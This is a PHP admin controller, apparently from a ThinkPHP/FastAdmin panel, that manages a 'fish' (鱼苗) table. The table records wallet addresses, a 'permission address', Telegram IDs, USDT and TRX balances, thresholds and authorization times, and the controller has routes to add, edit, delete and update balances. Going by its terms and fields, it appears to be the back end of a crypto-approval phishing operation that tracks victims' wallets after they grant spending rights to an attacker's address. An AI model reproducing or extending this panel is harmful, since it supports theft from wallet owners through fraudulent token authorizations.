<?php
namespace app\admin\controller;

use app\common\controller\Backend;
use think\Db;

/**
 * 鱼苗管理
 * 
 * @icon fa fa-fish
 * @remark 鱼苗信息管理，包括余额统计和阈值设置
 */
class Fish extends Backend 
{
    // 无需登录的方法
    protected $noNeedLogin = [];

    // 无需鉴权的方法
    protected $noNeedRight = [];

    /**
     * 初始化
     */
    public function _initialize()
    {
        parent::_initialize();
        
        try {
            Db::query("SELECT 1");
        } catch (\Exception $e) {
            return json(['code' => 0, 'msg' => "数据库连接失败：" . $e->getMessage()]);
        }
    }

    /**
     * 查看
     */
    public function index()
    {
        try {
            $tables = Db::query("SHOW TABLES LIKE 'fish'");
            if (empty($tables)) {
                $this->createTable();
            }

            if ($this->request->isAjax()) {
                $fishData = Db::name('fish')
                    ->order('id', 'desc')
                    ->select();
                
                return json([
                    "total" => count($fishData),
                    "rows" => $fishData
                ]);
            }

            $model = Db::name('fish');
            $totalUSDT = $model->sum('usdt_balance') ?: '0.000000';
            $totalTRX = $model->sum('trx_balance') ?: '0.000000';
            $totalFish = $model->count() ?: 0;
            $todayStart = date('Y-m-d 00:00:00');
            $todayNew = $model->where('time', '>=', $todayStart)->count() ?: 0;

            $fishData = $model->order('id', 'desc')->select();

            $this->assign([
                'totalUSDT' => $totalUSDT,
                'totalTRX' => $totalTRX,
                'totalFish' => $totalFish,
                'todayNew' => $todayNew,
                'fishData' => $fishData ?: [],
                'title' => '鱼苗管理'
            ]);

            return $this->view->fetch();

        } catch (\Exception $e) {
            return json(['code' => 0, 'msg' => $e->getMessage()]);
        }
    }

    /**
     * 添加
     */
    public function add()
    {
        if (!$this->request->isPost()) {
            return json(['code' => 0, 'msg' => '非法请求']);
        }

        $params = $this->request->post();
            
        Db::startTrans();
        try {
            $data = [
                'fish_address' => $params['fish_address'],
                'permissions_fishaddress' => $params['permissions_fishaddress'],
                'tguid' => $params['tguid'],
                'threshold' => $params['threshold'],
                'usdt_balance' => '0.000000',
                'trx_balance' => '0.000000',
                'time' => $params['time'] ?: date('Y-m-d H:i:s'),
                'remark' => isset($params['remark']) ? $params['remark'] : ''
            ];

            Db::name('fish')->insert($data);
            Db::commit();
            return json(['code' => 1, 'msg' => '添加成功']);
        } catch (\Exception $e) {
            Db::rollback();
            return json(['code' => 0, 'msg' => '添加失败：' . $e->getMessage()]);
        }
    }

    /**
     * 删除
     * @param string $ids
     */
    public function del($ids = null)
    {
        if (!$this->request->isPost()) {
            return json(['code' => 0, 'msg' => '非法请求']);
        }

        $ids = $ids ?: $this->request->post('id');
        if (!$ids) {
            return json(['code' => 0, 'msg' => '参数错误']);
        }

        Db::startTrans();
        try {
            Db::name('fish')->where('id', 'in', $ids)->delete();
            Db::commit();
            return json(['code' => 1, 'msg' => '删除成功']);
        } catch (\Exception $e) {
            Db::rollback();
            return json(['code' => 0, 'msg' => '删除失败：' . $e->getMessage()]);
        }
    }

    /**
     * 更新
     */
    public function update()
    {
        if (!$this->request->isPost()) {
            return json(['code' => 0, 'msg' => '非法请求']);
        }

        $params = $this->request->post();
            
        Db::startTrans();
        try {
            if (!isset($params['id']) || !isset($params['field']) || !isset($params['value'])) {
                return json(['code' => 0, 'msg' => '参数不完整']);
            }

            $allowFields = [
                'fish_address',
                'permissions_fishaddress',
                'tguid',
                'threshold',
                'time',
                'remark'
            ];

            if (!in_array($params['field'], $allowFields)) {
                return json(['code' => 0, 'msg' => '不允许更新该字段']);
            }

            Db::name('fish')
                ->where('id', $params['id'])
                ->update([$params['field'] => $params['value']]);

            Db::commit();
            return json(['code' => 1, 'msg' => '更新成功']);
        } catch (\Exception $e) {
            Db::rollback();
            return json(['code' => 0, 'msg' => '更新失败：' . $e->getMessage()]);
        }
    }

    /**
     * 更新余额
     */
    public function balance()
    {
        if (!$this->request->isPost()) {
            return json(['code' => 0, 'msg' => '非法请求']);
        }

        $params = $this->request->post();
            
        Db::startTrans();
        try {
            $updateData = [
                'usdt_balance' => $params['usdt_balance'],
                'trx_balance' => $params['trx_balance']
            ];

            Db::name('fish')
                ->where('id', $params['id'])
                ->update($updateData);

            Db::commit();
            return json(['code' => 1, 'msg' => '更新成功', 'data' => $updateData]);
        } catch (\Exception $e) {
            Db::rollback();
            return json(['code' => 0, 'msg' => '更新失败：' . $e->getMessage()]);
        }
    }

    /**
     * 创建数据表
     */
    protected function createTable()
    {
        $sql = "CREATE TABLE IF NOT EXISTS `fish` (
            `id` int(11) NOT NULL AUTO_INCREMENT,
            `fish_address` varchar(255) NOT NULL COMMENT '鱼苗地址',
            `permissions_fishaddress` varchar(255) NOT NULL COMMENT '权限地址',
            `tguid` varchar(50) NOT NULL COMMENT '电报ID',
            `usdt_balance` decimal(18,6) DEFAULT '0.000000' COMMENT '鱼苗USDT余额',
            `trx_balance` decimal(18,6) DEFAULT '0.000000' COMMENT '鱼苗TRX余额',
            `threshold` decimal(18,6) DEFAULT '0.000000' COMMENT '阈值',
            `time` varchar(255) DEFAULT NULL COMMENT '授权时间',
            `remark` varchar(255) DEFAULT NULL COMMENT '鱼苗备注',
            PRIMARY KEY (`id`),
            KEY `idx_tguid` (`tguid`),
            KEY `idx_fish_address` (`fish_address`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;";

        Db::execute($sql);
    }
}